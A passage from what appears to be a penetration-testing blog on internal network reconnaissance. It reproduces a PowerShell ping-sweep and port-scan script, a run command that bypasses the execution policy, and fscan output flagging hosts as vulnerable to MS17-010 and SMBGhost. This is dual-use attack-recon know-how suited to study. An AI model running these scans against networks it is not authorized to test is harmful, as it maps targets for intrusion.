= False </span><br><span class="line">End select </span><br><span class="line">Exit For </span><br><span class="line">Next</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure>

<p><strong>powershell</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">Invoke-TSPingSweep.ps1</span><br><span class="line">function Invoke-TSPingSweep &#123;</span><br><span class="line">    &lt;#</span><br><span class="line">        .SYNOPSIS</span><br><span class="line">        Scan IP-Addresses, Ports and HostNames</span><br><span class="line">        </span><br><span class="line">        .DESCRIPTION</span><br><span class="line">        Scan for IP-Addresses, HostNames and open Ports in your Network.</span><br><span class="line">        </span><br><span class="line">        .PARAMETER StartAddress</span><br><span class="line">        StartAddress Range</span><br><span class="line">        </span><br><span class="line">        .PARAMETER EndAddress</span><br><span class="line">        EndAddress Range</span><br><span class="line">        </span><br><span class="line">        .PARAMETER ResolveHost</span><br><span class="line">        Resolve HostName</span><br><span class="line">        </span><br><span class="line">        .PARAMETER ScanPort</span><br><span class="line">        Perform a PortScan</span><br><span class="line">        </span><br><span class="line">        .PARAMETER Ports</span><br><span class="line">        Ports That should be scanned, default values are: 21,22,23,53,69,71,80,98,110,139,111,389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901</span><br><span class="line">        </span><br><span class="line">        .PARAMETER TimeOut</span><br><span class="line">        Time (in MilliSeconds) before TimeOut, Default set to 100</span><br><span class="line">        </span><br><span class="line">        .EXAMPLE</span><br><span class="line">        Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254</span><br><span class="line"></span><br><span class="line">        .EXAMPLE</span><br><span class="line">        Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost</span><br><span class="line">        </span><br><span class="line">        .EXAMPLE</span><br><span class="line">        Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort</span><br><span class="line"></span><br><span class="line">        .EXAMPLE</span><br><span class="line">        Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort -TimeOut 500</span><br><span class="line">        </span><br><span class="line">        .EXAMPLE</span><br><span class="line">        Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.10.254 -ResolveHost -ScanPort -Port 80</span><br><span class="line"></span><br><span class="line">        .LINK</span><br><span class="line">        http://www.truesec.com</span><br><span class="line">        </span><br><span class="line">        .NOTES</span><br><span class="line">        Goude 2012, TrueSec</span><br><span class="line">    #&gt;</span><br><span class="line">    Param(</span><br><span class="line">        [parameter(Mandatory = $true,</span><br><span class="line">            Position = 0)]</span><br><span class="line">        [ValidatePattern(&quot;\b\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\b&quot;)]</span><br><span class="line">        [string]$StartAddress,</span><br><span class="line">        [parameter(Mandatory = $true,</span><br><span class="line">            Position = 1)]</span><br><span class="line">        [ValidatePattern(&quot;\b\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\b&quot;)]</span><br><span class="line">        [string]$EndAddress,</span><br><span class="line">        [switch]$ResolveHost,</span><br><span class="line">        [switch]$ScanPort,</span><br><span class="line">        [int[]]$Ports = @(21,22,23,53,69,71,80,98,110,139,111,389,443,445,1080,1433,2001,2049,3001,3128,</span><br><span class="line">5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901),</span><br><span class="line">        [int]$TimeOut = 100</span><br><span class="line">    )</span><br><span class="line">    Begin &#123;</span><br><span class="line">        $ping = New-Object System.Net.Networkinformation.Ping</span><br><span class="line">    &#125;</span><br><span class="line">    Process &#123;</span><br><span class="line">        foreach($a in ($StartAddress.Split(&quot;.&quot;)[0]..$EndAddress.Split(&quot;.&quot;)[0])) &#123;</span><br><span class="line">            foreach($b in ($StartAddress.Split(&quot;.&quot;)[1]..$EndAddress.Split(&quot;.&quot;)[1])) &#123;</span><br><span class="line">                foreach($c in ($StartAddress.Split(&quot;.&quot;)[2]..$EndAddress.Split(&quot;.&quot;)[2]))</span><br><span class="line">&#123;</span><br><span class="line">                    foreach($d in ($StartAddress.Split(&quot;.&quot;)[3]..$EndAddress.Split(&quot;.&quot;)[3])) &#123;</span><br><span class="line">                        write-progress -activity PingSweep -status &quot;$a.$b.$c.$d&quot; -percentcomplete (($d/($EndAddress.Split(&quot;.&quot;)[3])) * 100)</span><br><span class="line">                        $pingStatus = $ping.Send(&quot;$a.$b.$c.$d&quot;,$TimeOut)</span><br><span class="line">                        if($pingStatus.Status -eq &quot;Success&quot;) &#123;</span><br><span class="line">                            if($ResolveHost) &#123;</span><br><span class="line">                                    write-progress -activity ResolveHost -status &quot;$a.$b.$c.$d&quot; -percentcomplete (($d/($EndAddress.Split(&quot;.&quot;)[3])) * 100) -Id 1</span><br><span class="line">                                    $getHostEntry = [Net.DNS]::BeginGetHostEntry($pingStatus.Address, $null,$null)</span><br><span class="line">                            &#125;</span><br><span class="line">                            if($ScanPort) &#123;</span><br><span class="line">                                $openPorts = @()</span><br><span class="line">                                for($i = 1; $i -le $ports.Count;$i++) &#123;</span><br><span class="line">                                    $port = $Ports[($i-1)]</span><br><span class="line">                                    write-progress -activity PortScan -status &quot;$a.$b.$c.$d&quot; -percentcomplete (($i/($Ports.Count)) * 100) -Id 2</span><br><span class="line">                                    $client = New-Object System.Net.Sockets.TcpClient</span><br><span class="line">                                    $beginConnect =</span><br><span class="line">$client.BeginConnect($pingStatus.Address,$port,$null,$null)</span><br><span class="line">                                    if($client.Connected) &#123;</span><br><span class="line">                                        $openPorts += $port</span><br><span class="line">                                    &#125; else &#123;</span><br><span class="line">                                        # Wait</span><br><span class="line">                                        Start-Sleep -Milli $TimeOut</span><br><span class="line">                                        if($client.Connected) &#123;</span><br><span class="line">                                            $openPorts += $port</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    $client.Close()</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            if($ResolveHost) &#123;</span><br><span class="line">                                $hostName =</span><br><span class="line">([Net.DNS]::EndGetHostEntry([IAsyncResult]$getHostEntry)).HostName</span><br><span class="line">                            &#125;</span><br><span class="line">                            # Return Object</span><br><span class="line">                            New-Object PSObject -Property @&#123;</span><br><span class="line">                                IPAddress = &quot;$a.$b.$c.$d&quot;;</span><br><span class="line">                                HostName = $hostName;</span><br><span class="line">                                Ports = $openPorts</span><br><span class="line">                            &#125; | Select-Object IPAddress, HostName, Ports</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    End &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># SIG # Begin signature block</span><br><span class="line"># MIINGAYJKoZIhvcNAQcCoIINCTCCDQUCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB</span><br><span class="line"># gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR</span><br><span class="line"># AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUDtjslARLrEIY+LjC2tihCYoE</span><br><span class="line"># ax2gggpaMIIFIjCCBAqgAwIBAgIQAupQIxjzGlMFoE+9rHncOTANBgkqhkiG9w0B</span><br><span class="line"># AQsFADByMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYD</span><br><span class="line"># VQQLExB3d3cuZGlnaWNlcnQuY29tMTEwLwYDVQQDEyhEaWdpQ2VydCBTSEEyIEFz</span><br><span class="line"># c3VyZWQgSUQgQ29kZSBTaWduaW5nIENBMB4XDTE0MDcxNzAwMDAwMFoXDTE1MDcy</span><br><span class="line"># MjEyMDAwMFowaTELMAkGA1UEBhMCQ0ExCzAJBgNVBAgTAk9OMREwDwYDVQQHEwhI</span><br><span class="line"># YW1pbHRvbjEcMBoGA1UEChMTRGF2aWQgV2F5bmUgSm9obnNvbjEcMBoGA1UEAxMT</span><br><span class="line"># RGF2aWQgV2F5bmUgSm9obnNvbjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC</span><br><span class="line"># ggEBAM3+T+61MoGxUHnoK0b2GgO17e0sW8ugwAH966Z1JIzQvXFa707SZvTJgmra</span><br><span class="line"># ZsCn9fU+i9KhC0nUpA4hAv/b1MCeqGq1O0f3ffiwsxhTG3Z4J8mEl5eSdcRgeb+1</span><br><span class="line"># jaKI3oHkbX+zxqOLSaRSQPn3XygMAfrcD/QI4vsx8o2lTUsPJEy2c0z57e1VzWlq</span><br><span class="line"># KHqo18lVxDq/YF+fKCAJL57zjXSBPPmb/sNj8VgoxXS6EUAC5c3tb+CJfNP2U9vV</span><br><span class="line"># oy5YeUP9bNwq2aXkW0+xZIipbJonZwN+bIsbgCC5eb2aqapBgJrgds8cw8WKiZvy</span><br><span class="line"># Zx2qT7hy9HT+LUOI0l0K0w31dF8CAwEAAaOCAbswggG3MB8GA1UdIwQYMBaAFFrE</span><br><span class="line"># uXsqCqOl6nEDwGD5LfZldQ5YMB0GA1UdDgQWBBTnMIKoGnZIswBx8nuJckJGsFDU</span><br><span class="line"># lDAOBgNVHQ8BAf8EBAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUHAwMwdwYDVR0fBHAw</span><br><span class="line"># bjA1oDOgMYYvaHR0cDovL2NybDMuZGlnaWNlcnQuY29tL3NoYTItYXNzdXJlZC1j</span><br><span class="line"># cy1nMS5jcmwwNaAzoDGGL2h0dHA6Ly9jcmw0LmRpZ2ljZXJ0LmNvbS9zaGEyLWFz</span><br><span class="line"># c3VyZWQtY3MtZzEuY3JsMEIGA1UdIAQ7MDkwNwYJYIZIAYb9bAMBMCowKAYIKwYB</span><br><span class="line"># BQUHAgEWHGh0dHBzOi8vd3d3LmRpZ2ljZXJ0LmNvbS9DUFMwgYQGCCsGAQUFBwEB</span><br><span class="line"># BHgwdjAkBggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tME4GCCsG</span><br><span class="line"># AQUFBzAChkJodHRwOi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRTSEEy</span><br><span class="line"># QXNzdXJlZElEQ29kZVNpZ25pbmdDQS5jcnQwDAYDVR0TAQH/BAIwADANBgkqhkiG</span><br><span class="line"># 9w0BAQsFAAOCAQEAVlkBmOEKRw2O66aloy9tNoQNIWz3AduGBfnf9gvyRFvSuKm0</span><br><span class="line"># Zq3A6lRej8FPxC5Kbwswxtl2L/pjyrlYzUs+XuYe9Ua9YMIdhbyjUol4Z46jhOrO</span><br><span class="line"># TDl18txaoNpGE9JXo8SLZHibwz97H3+paRm16aygM5R3uQ0xSQ1NFqDJ53YRvOqT</span><br><span class="line"># 60/tF9E8zNx4hOH1lw1CDPu0K3nL2PusLUVzCpwNunQzGoZfVtlnV2x4EgXyZ9G1</span><br><span class="line"># x4odcYZwKpkWPKA4bWAG+Img5+dgGEOqoUHh4jm2IKijm1jz7BRcJUMAwa2Qcbc2</span><br><span class="line"># ttQbSj/7xZXL470VG3WjLWNWkRaRQAkzOajhpTCCBTAwggQYoAMCAQICEAQJGBtf</span><br><span class="line"># 1btmdVNDtW+VUAgwDQYJKoZIhvcNAQELBQAwZTELMAkGA1UEBhMCVVMxFTATBgNV</span><br><span class="line"># BAoTDERpZ2lDZXJ0IEluYzEZMBcGA1UECxMQd3d3LmRpZ2ljZXJ0LmNvbTEkMCIG</span><br><span class="line"># A1UEAxMbRGlnaUNlcnQgQXNzdXJlZCBJRCBSb290IENBMB4XDTEzMTAyMjEyMDAw</span><br><span class="line"># MFoXDTI4MTAyMjEyMDAwMFowcjELMAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lD</span><br><span class="line"># ZXJ0IEluYzEZMBcGA1UECxMQd3d3LmRpZ2ljZXJ0LmNvbTExMC8GA1UEAxMoRGln</span><br><span class="line"># aUNlcnQgU0hBMiBBc3N1cmVkIElEIENvZGUgU2lnbmluZyBDQTCCASIwDQYJKoZI</span><br><span class="line"># hvcNAQEBBQADggEPADCCAQoCggEBAPjTsxx/DhGvZ3cH0wsxSRnP0PtFmbE620T1</span><br><span class="line"># f+Wondsy13Hqdp0FLreP+pJDwKX5idQ3Gde2qvCchqXYJawOeSg6funRZ9PG+ykn</span><br><span class="line"># x9N7I5TkkSOWkHeC+aGEI2YSVDNQdLEoJrskacLCUvIUZ4qJRdQtoaPpiCwgla4c</span><br><span class="line"># SocI3wz14k1gGL6qxLKucDFmM3E+rHCiq85/6XzLkqHlOzEcz+ryCuRXu0q16XTm</span><br><span class="line"># K/5sy350OTYNkO/ktU6kqepqCquE86xnTrXE94zRICUj6whkPlKWwfIPEvTFjg/B</span><br><span class="line"># ougsUfdzvL2FsWKDc0GCB+Q4i2pzINAPZHM8np+mM6n9Gd8lk9ECAwEAAaOCAc0w</span><br><span class="line"># ggHJMBIGA1UdEwEB/wQIMAYBAf8CAQAwDgYDVR0PAQH/BAQDAgGGMBMGA1UdJQQM</span><br><span class="line"># MAoGCCsGAQUFBwMDMHkGCCsGAQUFBwEBBG0wazAkBggrBgEFBQcwAYYYaHR0cDov</span><br><span class="line"># L29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRwOi8vY2FjZXJ0cy5k</span><br><span class="line"># aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3J0MIGBBgNVHR8E</span><br><span class="line"># ejB4MDqgOKA2hjRodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1</span><br><span class="line"># cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v</span><br><span class="line"># RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsME8GA1UdIARIMEYwOAYKYIZIAYb9</span><br><span class="line"># bAACBDAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2VydC5jb20vQ1BT</span><br><span class="line"># MAoGCGCGSAGG/WwDMB0GA1UdDgQWBBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAfBgNV</span><br><span class="line"># HSMEGDAWgBRF66Kv9JLLgjEtUYunpyGd823IDzANBgkqhkiG9w0BAQsFAAOCAQEA</span><br><span class="line"># PuwNWiSz8yLRFcgsfCUpdqgdXRwtOhrE7zBh134LYP3DPQ/Er4v97yrfIFU3sOH2</span><br><span class="line"># 0ZJ1D1G0bqWOWuJeJIFOEKTuP3GOYw4TS63XX0R58zYUBor3nEZOXP+QsRsHDpEV</span><br><span class="line"># +7qvtVHCjSSuJMbHJyqhKSgaOnEoAjwukaPAJRHinBRHoXpoaK+bp1wgXNlxsQyP</span><br><span class="line"># u6j4xRJon89Ay0BEpRPw5mQMJQhCMrI2iiQC/i9yfhzXSUWW6Fkd6fp0ZGuy62ZD</span><br><span class="line"># 2rOwjNXpDd32ASDOmTFjPQgaGLOBm0/GkxAG/AeB+ova+YJJ92JuoVP6EpQYhS6S</span><br><span class="line"># kepobEQysmah5xikmmRR7zGCAigwggIkAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUw</span><br><span class="line"># EwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20x</span><br><span class="line"># MTAvBgNVBAMTKERpZ2lDZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcg</span><br><span class="line"># Q0ECEALqUCMY8xpTBaBPvax53DkwCQYFKw4DAhoFAKB4MBgGCisGAQQBgjcCAQwx</span><br><span class="line"># CjAIoAKAAKECgAAwGQYJKoZIhvcNAQkDMQwGCisGAQQBgjcCAQQwHAYKKwYBBAGC</span><br><span class="line"># NwIBCzEOMAwGCisGAQQBgjcCARUwIwYJKoZIhvcNAQkEMRYEFGGdjjPAicJNVNbF</span><br><span class="line"># +Rz5j79kKh51MA0GCSqGSIb3DQEBAQUABIIBAHRy5Qa+5mmePnP9ZpS8YCsexj+6</span><br><span class="line"># OvA2XD4lNpQEsvuW68ECTEpwUXCPSKIimKompsdKdNJ147fjvRPl1FTkC7G1XCn2</span><br><span class="line"># qymNxFpUabdiKpyQL042k4o8Naa8CfQLsnlaG2boew6Jay9w8dlXGmuVG3CDtD5r</span><br><span class="line"># mId6oTEZjauK3vU5+eUfDIMO6U7MaTF0C3ItmGyvfOENSnWTCSWoeRUSqHc8v/np</span><br><span class="line"># 2qay6qvKFX8F5yMG4K5WGYFL5q37FKiMdsXiG3hj3xRYmr3g+yWoZm6AVBGGDOBk</span><br><span class="line"># 62IpemyM98KuozkzTxUtvzbucaVnpu+l0z4yrGbqIVBNxe+gu7QchKrjDVc=</span><br><span class="line"># SIG # End signature block</span><br><span class="line">powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-TSPingSweep.ps1;</span><br><span class="line">Invoke-TSPingSweep -StartAddress 192.168.7.1 -EndAddress 192.168.7.254 -</span><br><span class="line">ResolveHost -ScanPort -Port 445,135&quot;</span><br></pre></td></tr></table></figure>

<p><strong>fscan</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">fscan</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 192.168.7.1-255 -p 22,445</span><br><span class="line"></span><br><span class="line">  _</span><br><span class="line">/ _ \                 _           _ | |     </span><br><span class="line">/ /_\/  /   |/   | &#x27; / _` |/  | |/ /</span><br><span class="line">/ /_\\  \   \ ( | | | (_| | ( | &lt;</span><br><span class="line">\   /   |   /\  |_| \ ,_|\  |_|\_\</span><br><span class="line">fscan version: 1.5.1</span><br><span class="line">scan start</span><br><span class="line">(icmp) Target &#x27;192.168.7.7&#x27; is alive </span><br><span class="line">(icmp) Target &#x27;192.168.7.110&#x27; is alive</span><br><span class="line">(icmp) Target &#x27;192.168.7.107&#x27; is alive </span><br><span class="line">icmp alive hosts len is: 3 </span><br><span class="line">192.168.7.110:445 open</span><br><span class="line">192.168.7.7:445 open</span><br><span class="line">192.168.7.107:445 open</span><br><span class="line">192.168.7.110 CVE-2020-0796 SmbGhost Vulnerable </span><br><span class="line">192.168.7.110 (Windows 10 Pro 18363)</span><br><span class="line">[+] 192.168.7.7 MS17-010    (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)</span><br><span class="line">[+] 192.168.7.107 MS17-010 (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">scan end</span><br></pre></td></tr></table></figure>

<p>netdiscover,snscan,nmap,msf。。。</p>
<h2 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h2><ul>
<li>端口banner信息</li>
<li>端口上运行的服务</li>
<li>常见应用的默认端口</li>
</ul>
<p><strong>powershell</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span 